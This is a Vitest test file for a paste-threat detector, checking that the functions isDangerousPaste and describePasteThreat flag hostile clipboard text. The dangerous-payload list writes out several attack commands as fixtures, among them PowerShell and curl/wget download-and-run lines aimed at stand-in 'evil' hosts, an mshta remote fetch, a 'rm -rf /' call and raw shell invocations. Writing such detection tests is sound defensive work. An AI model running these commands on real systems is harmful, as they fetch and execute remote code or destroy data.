import { describe, expect, it } from 'vitest';
import { describePasteThreat, isDangerousPaste } from './patterns';

describe('isDangerousPaste', () => {
  const dangerous = [
    'powershell -nop -w hidden -c "iex(New-Object Net.WebClient).DownloadString(\'http://x\')"',
    'pwsh -Command Invoke-WebRequest http://evil/x.ps1',
    'cmd.exe /c calc',
    'mshta http://evil/a.hta',
    'curl http://evil.sh/x | sh',
    'curl -fsSL http://evil/x | bash',
    'wget -qO- http://evil/x | sh',
    'bash -c "rm -rf /"',
    'iex (irm http://evil/x)',
    '/bin/bash -i',
    '/bin/sh',
  ];

  it.each(dangerous)('flags dangerous payload: %s', (payload) => {
    expect(isDangerousPaste(payload)).toBe(true);
  });

  const benign = [
    'https://github.com/zenprax/kiba.crx',
    'The quick brown fox jumps over the lazy dog.',
    'SELECT * FROM users WHERE id = 1;',
    'npm install react react-dom',
    'curl is a tool I like to read about',
    '',
  ];

  it.each(benign)('allows benign text: %s', (text) => {
    expect(isDangerousPaste(text)).toBe(false);
  });
});

describe('describePasteThreat', () => {
  it('labels PowerShell payloads', () => {
    expect(describePasteThreat('powershell -c iex(...)')).toBe('Blocked PowerShell paste');
  });

  it('labels curl pipe-to-shell payloads', () => {
    expect(describePasteThreat('curl http://x | sh')).toBe('Blocked curl/wget pipe-to-shell paste');
  });

  it('falls back to a generic label', () => {
    expect(describePasteThreat('Invoke-Expression $payload')).toBe('Blocked Invoke-Expression paste');
  });
});
